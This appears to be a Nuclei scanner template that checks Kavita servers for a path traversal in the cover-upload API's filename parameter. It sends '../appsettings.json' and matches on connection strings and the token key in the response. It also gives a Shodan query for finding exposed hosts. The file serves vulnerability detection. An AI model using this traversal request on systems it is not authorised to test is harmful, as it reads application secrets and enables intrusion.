id: kavita-lfi
info:
  author: arafatansari
  description: 'kareadita/kavita allows Path Traversal by abusing the filename parameter
    of the /api/image/cover-upload.

    '
  metadata:
    shodan-query: http.html:"kavita"
    verified: true
  name: Kavita - Path Traversal
  reference:
  - https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/
  severity: medium
  tags: kavita,lfi,huntr
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"ConnectionStrings":'
    - '"Path":'
    - '"TokenKey":'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/image/cover-upload?filename=../appsettings.json'
